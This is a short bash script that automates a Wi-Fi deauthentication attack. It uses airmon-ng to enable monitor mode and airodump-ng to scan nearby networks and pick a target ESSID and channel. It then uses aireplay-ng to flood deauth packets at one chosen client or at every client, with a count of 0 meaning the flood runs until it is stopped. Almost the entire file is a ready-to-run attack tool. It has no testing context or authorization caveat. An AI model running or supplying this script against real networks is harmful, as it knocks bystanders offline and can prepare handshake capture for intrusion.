#!/bin/bash


clear
echo "starting scan"
echo "Network adapter will scan for set amount, if you found the correct station, do ctrl+c"
echo "set amount of seconds for scan, then click enter"
read ScanTime
sudo airmon-ng start wlan0
sudo timeout $ScanTime airodump-ng wlan0mon
echo "please enter station"
read ESSID
echo "now enter the channel of that station"
read Channel
echo "lastly enter scan time for station(minimum 1)"
read ScanTime
sudo timeout $ScanTime airodump-ng --essid $ESSID -c $Channel wlan0mon
echo "Do you want to target a specific client?(if no it will deauth all available clients.)"
echo "1=yes, 0=no"
read Des
if [ $Des -eq 1 ]
then
	echo "Enter client("station")"
	read client
	echo "how many packets do you wush to send(if 0, it will continue untill you press ctrl+c"
	read PacketAmount
	echo "starting deauth"
	sleep 1
	sudo aireplay-ng -0 $PacketAmount -e $ESSID -c $client wlan0mon
else
	echo "how many packets do you wish to send?(if 0, it will continue untill you press ctrl+c"
	read PacketAmount
	echo "starting deauth"
	sleep 1
	sudo aireplay-ng -0 $PacketAmount -e $ESSID wlan0mon
fi
echo "deauth finished."
echo "program closing in 5"
sleep 1
echo "program closing in 4"
sleep 1
echo "program closing in 3"
sleep 1
echo "program closing in 2"
sleep 1
echo "program closing in 1"
sleep 1
